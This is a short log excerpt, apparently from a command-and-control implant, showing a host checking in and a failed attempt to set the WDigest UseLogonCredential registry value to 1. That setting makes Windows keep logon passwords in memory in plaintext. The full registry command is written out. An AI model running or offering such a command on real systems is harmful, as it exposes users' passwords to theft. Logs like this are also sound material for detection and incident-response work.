+01/12 08:21:37 UTC [checkin] host called home, sent: 145 bytes
+01/12 08:21:37 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f: 5 - ERROR_ACCESS_DENIED
